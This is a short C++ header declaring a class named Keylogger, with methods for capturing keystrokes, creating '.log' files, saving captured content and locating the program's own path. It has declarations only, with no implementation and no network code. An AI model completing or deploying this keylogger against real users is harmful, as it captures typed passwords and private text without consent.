#pragma once

#include <string>
#include <fstream>

#define FILEEXT ".log"
#define DEBUG
//#define DEBUG_TO_LOGS

class Keylogger
{
private:
	std::string intToString(int);
	std::string getSelfPath();
	std::string dirBasename(std::string);

	void save_to_file(std::ofstream &file_stream, const std::string &content);

	std::string m_file_path;
	std::ofstream file_logs_clean_keys;

public:	
	Keylogger();
	Keylogger(bool save_enabled);
	
	bool saving_enabled = false;
	void get_key(std::ofstream &file_logs);
	std::string create_file();
	std::ofstream& get_file_logs_clean_keys();
};
